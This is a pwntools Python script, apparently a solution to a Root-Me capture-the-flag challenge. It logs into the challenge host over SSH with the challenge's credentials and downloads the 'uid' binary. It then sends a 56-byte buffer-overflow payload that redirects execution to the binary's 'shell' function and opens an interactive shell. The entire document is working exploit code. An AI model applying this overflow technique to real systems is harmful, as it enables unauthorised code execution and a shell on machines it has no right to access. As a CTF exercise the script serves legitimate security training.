from pwn import *
 
bufsize = 56
file_path = "./uid"
 
shell=ssh(
        host="challenge02.root-me.org",
        port=2222,
        user="app-systeme-ch15",
        password="app-systeme-ch15"
    )
 
shell.download(file_path)

p = shell.process(file_path)

shell_funct_addr = ELF(file_path).symbols['shell']

payload = fit({
    bufsize: p64(shell_funct_addr),
})

log.info("Sending payload : %r" % payload)
p.send(payload)
p.interactive()


